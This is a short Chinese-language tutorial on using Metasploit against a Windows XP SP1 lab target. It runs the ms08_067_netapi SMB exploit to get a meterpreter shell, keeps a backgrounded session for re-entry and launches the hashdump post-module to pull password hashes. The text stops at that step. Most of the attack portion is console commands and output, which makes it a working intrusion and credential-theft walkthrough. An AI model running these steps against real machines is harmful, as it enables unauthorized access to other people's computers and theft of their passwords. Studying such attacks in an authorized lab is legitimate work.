metsploit获取电脑密码

首先简单介绍一下metsploit这个工具，它是一款开源的安全漏洞检测工具，你可以利用这个工具中的模块，来对目标服务器进行渗透测试，例如经典的ms08_067等

开启软件

攻击机: Kali Linux
靶机: WindowsXP SP1
软件版本: 4.16.32

命令:

root@kali:~# msfconsole

开始实验

这次实验就用ms08067模块的来测试，若觉得过于无聊像直接跳到破解hash，可以直接跳到相应环节，那么，首先先查询模块的位置

msf > search ms08_067


可以看到这个模块是在exploit/windows/smb/下的，接着用use命令去使用它，然后show options 来查看需要配置的选项

msf > use exploit/windows/smb/ms08_067_netapi 
msf exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf exploit(windows/smb/ms08_067_netapi) >

设置目标IP

msf exploit(windows/smb/ms08_067_netapi) > set rhost x.x.x.x

设置完后，就可以开始攻击了

msf exploit(windows/smb/ms08_067_netapi) > exploit

meterpreter >

成功，这个时候我们就可以一定程度的为所欲为了，可以进行下一步，也就是本篇的主题了

破解hash密码

先在对方电脑上留一个会话，方便再次进入

meterpreter > background 
[*] Backgrounding session 1...
msf exploit(windows/smb/ms08_067_netapi) >

然后进行下一步,hashdump(PS:这一步需要连接metsploit的数据库，可以移步另一篇)

msf exploit(windows/smb/ms08_067_netapi) > use post/windows/gather/hashdump 
msf post(windows/gather/hashdump) > set session 1
session => 1
msf post(windows/gather/hashdump) > exploit
